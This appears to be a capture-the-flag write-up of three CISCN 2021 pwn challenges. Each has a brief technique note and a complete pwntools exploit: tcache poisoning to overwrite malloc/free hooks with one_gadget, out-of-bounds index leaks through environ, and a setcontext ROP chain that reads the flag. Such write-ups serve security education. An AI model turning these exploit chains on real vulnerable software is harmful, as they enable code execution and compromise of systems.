# Ciscn2021 Pwn


# Ciscn2021-pwn

国赛部分pwn题的解答

<!-- more -->

# lonelywolf

double_free leak heap address ，打tcache_struct,leak libc，控制 next指针覆写__malloc_hook为og

```python=
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

# p = process("./lonelywolf",env={'LD_PRELOAD':"./libc-2.27.so"})
p = remote('123.60.210.12',21885)
 
def add(size):
    p.sendlineafter("Your choice: ", '1')
    p.sendlineafter("Index:", '0')
    p.sendlineafter("Size:", str(size))

def delete():
    p.sendlineafter("Your choice: ", '4')
    p.sendlineafter("Index:", '0')

def edit(payload):
    p.sendlineafter("Your choice: ", '2')
    p.sendlineafter("Index:", '0')
    p.sendlineafter("Content: ", payload)

def show():
    p.sendlineafter("Your choice: ", '3')
    p.sendlineafter("Index:", '0')
    
libc = ELF('./libc-2.27.so')
one = [0x4f3d5,0x4f432,0x10a41c]

if __name__ == "__main__":
    add(0x78)
    delete()
    edit('8'*9)
    delete()
    show()
    
    heap_base = u64(p.recvuntil('\x55')[-6:].ljust(8,'\x00')) - 0x260
    print(hex(heap_base))
    # edit('8'*9)
    # delete()
    # pause()
    edit(p64(heap_base+0x10))
    add(0x78)
    add(0x78) # ub
    edit('A'*0x30)
    # add(0x10)

    delete()
    show()
    malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 96 - 0x10
    libcbase = malloc_hook - libc.sym['__malloc_hook']
    print(hex(libcbase))

    # add(0x78)
    edit(p64(malloc_hook)*10)
    add(0x10)

    og = libcbase+one[2]
    edit(p64(og))
    # gdb.attach(p)
    show()  

    p.interactive()  
```

flag = CISCN{iMf3k-MX3gi-NxKKS-IWx8t-5HlNV-}

# pwny

数组超界，使用fini_array泄露程序基址，environ泄露栈，覆盖返回地址为og

```python=
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')
# p = process("./pwny",env={'LD_PRELOAD':"./libc-2.27.so"})

libc = ELF('./libc-2.27.so')
 
def read(idx):
    p.sendlineafter('Your choice: ','1')
    p.sendafter('Index:',p64(idx))

def write(idx,data):
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter('Index:',str(idx))
    p.sendline(data)

one = [0x4f3d5,0x4f432,0x10a41c]
# fini_array = 0x201D88
# base = 0x202060

if __name__ == "__main__":
    p = remote('123.60.210.12',21970)
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter('Index:',str(256))
    p.sendlineafter('Your choice: ','2')
    p.sendlineafter('Index:',str(256))    
    write(256, '\x00'*8)

    read(0xfffffffffffffffc)
    p.recvuntil('Result: ')
    stderr_addr = int(p.recv(12),16)
    libcbase = stderr_addr - libc.sym['_IO_2_1_stderr_']
    print(hex(stderr_addr))
    print(hex(libcbase))
    # idx = 0xfffffffffffffffc-1
    read(0xffffffffffffffa5)
    # gdb.attach(p)
    p.recvuntil('Result: ')
    text_addr = int(p.recv(12),16)
    textbase = text_addr - 0x9c0
    print(hex(textbase))

    env = libcbase + libc.sym['environ']
    print(hex(env))
    # stack = env - 0x10 
    base = 0x202060 + textbase
    print(hex(base))
    # pause()
    idx = (env - base)/8
    # idx = (~idx) + 1
    # print(hex(idx))
    read(idx)

    p.recvuntil('Result: ')
    stack_addr = int(p.recv(12),16)
    ret_addr = stack_addr - 0x120
    print(hex(ret_addr))
    og = libcbase + one[2]
    
    idx = (ret_addr - base )/8
    # gdb.attach(p)

    write(idx, p64(og))

    p.interactive()
```

flag = CISCN{5o9ui-tLK7G-D1sUb-VrApG-dIhAm-}

# silverwolf

泄漏libc和劫持__free_hook和lonely一样，找chunk分开写ROP，利用setcontext来控制栈迁移，需要两次栈迁移。

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

# p = process("./silverwolf", env={'LD_PRELOAD': "./libc-2.27.so"})
libc = ELF('./libc-2.27.so')

p = remote('123.60.210.12', 21921)


def add(size):
    p.sendlineafter("Your choice: ", '1')
    p.sendlineafter("Index:", '0')
    p.sendlineafter("Size:", str(size))


def delete():
    p.sendlineafter("Your choice: ", '4')
    p.sendlineafter("Index:", '0')


def edit(payload):
    p.sendlineafter("Your choice: ", '2')
    p.sendlineafter("Index:", '0')
    p.sendlineafter("Content: ", payload)


def show():
    p.sendlineafter("Your choice: ", '3')
    p.sendlineafter("Index:", '0')

if __name__ == "__main__":
    add(0x58)
    delete()
    edit('8'*9)
    delete()
    show()
    p.recvuntil("Content: ")
    heap_base = u64(p.recv(6)+'\x00'*2) - 0x1880
    print(hex(heap_base))
    # gdb.attach(p)
    edit(p64(heap_base + 0x10))

    add(0x58)
    add(0x58) # ub
    edit('\x07'*0x30)
    delete()
    show()
    
    p.recvuntil("Content: ")
    libcbase = u64(p.recv(6)+'\x00'*2) - 0x3ebca0
    free_hook = libcbase + libc.sym['__free_hook']
    write_addr = libcbase + libc.sym['write']
    setcontext = libcbase + libc.sym['setcontext']+53
    print(hex(libcbase))
    pop_rdi = 0x215bf + libcbase
    pop_rsi = 0x23eea + libcbase
    pop_rax = 0x43ae8 + libcbase
    pop_rdx = 0x01b96 + libcbase
    pop_rsp = 0x03960 + libcbase
    read_call = 0x110140 + libcbase
    syscall_ret = 0xd2745 + libcbase
    
    payload = '\x01\x00\x00\x00\x00\x07\x07'+ '\x00'*(64 - 7) + p64(free_hook) + p64(0) * 2
    edit(payload)
   
    add(0x10)
    edit(p64(setcontext))
    
    add(0x68)
    add(0x68)
    add(0x68)
    edit(p64(heap_base+0x1210+8)+p64(pop_rdi))
    add(0x78)
    add(0x78)
    payload=p64(read_call)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30)+p64(write_addr)
    edit(payload)
    add(0x78)
    flag = heap_base+0x1210+8+0x60
    orw = ''
    orw+= p64(pop_rdi)+p64(flag)+p64(pop_rax)+p64(2)+p64(syscall_ret)
    orw+= p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base)+p64(pop_rdx)+p64(0x30)
    
    orw+= p64(pop_rsp)+p64(heap_base+0x1210-0xa0)
    edit(orw+"./flag\x00")
    #gdb.attach(p)
    delete()

    p.interactive()
```

flag = CISCN{NEqT9-o7fw0-qYWHr-uPwKk-qJj0T-}

